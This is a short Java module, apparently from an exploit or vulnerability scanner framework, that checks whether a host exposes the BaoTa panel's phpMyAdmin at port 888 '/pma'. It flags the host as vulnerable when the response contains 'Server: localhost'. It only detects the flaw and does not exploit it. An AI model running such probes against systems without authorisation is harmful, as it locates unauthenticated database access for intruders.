package com.motanni.exploit;

import com.motanni.BasePayload;
import com.motanni.HttpTool;

import java.net.URI;

public class baota_backdorr implements BasePayload {
    private static final String CheckStr="Server: localhost";
    private static URI getIP(URI uri) {
        URI effectiveURI = null;
        try {
            effectiveURI = new URI(uri.getHost());
        } catch (Throwable var4) {
            effectiveURI = null;
        }

        return effectiveURI;
    }


    public boolean checkVUL(String url) throws Exception{
        try {
            URI txf = getIP(URI.create(url));
            String test_result = HttpTool.getHttpReuest("http://"+txf+ ":888/pma", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
            throw e;
        }
        return false;
    }


}
